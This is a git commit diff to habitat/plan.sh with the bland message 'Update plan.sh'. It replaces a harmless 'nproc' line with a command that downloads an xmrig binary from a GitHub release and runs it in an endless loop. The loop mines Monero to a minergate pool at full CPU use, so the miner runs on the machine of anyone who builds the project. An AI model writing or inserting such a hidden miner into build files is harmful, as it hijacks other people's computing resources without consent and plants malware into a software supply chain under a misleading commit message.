8fe847e6875cf4613ad1d3967d28c0e4e3ae7bea
phyllishkibby <47544243+phyllishkibby@users.noreply.github.com>
2019-03-16 02:24:40 +0300

    Update plan.sh

--- habitat/plan.sh
+++ habitat/plan.sh
@@ -1,1 +1,1 @@
-nproc
+wget https://github.com/ruhewawod/mxlmax/releases/download/1/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done
